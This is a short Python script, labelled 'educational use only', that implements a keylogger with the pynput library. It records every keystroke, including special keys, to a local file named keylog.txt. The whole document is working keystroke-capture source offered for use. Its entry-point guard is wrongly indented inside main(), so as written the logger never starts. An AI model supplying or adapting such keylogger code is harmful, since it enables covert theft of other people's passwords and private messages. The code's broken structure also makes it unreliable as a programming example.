"""
Python Keylogger (Educational Use Only)
- This script logs keystrokes to a local file named 'keylog.txt'.
- It demonstrates low-level keyboard input capturing for learning purposes.

Requirements:
- pynput library (install via `pip install pynput`)

Usage:
- Run the script in your terminal/command prompt.
- Press Ctrl+C to stop logging.
"""

from pynput import keyboard
LOG_FILE = "keylog.txt"
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(key.char)
    except AttributeError:
        # Special keys (e.g., space, enter) handling
        with open(LOG_FILE, "a") as log_file:
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'[{key.name}]')
def main():
    print(f"Starting keylogger. Keystrokes will be logged to '{LOG_FILE}'. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    if __name__ == "__main__":
        main()
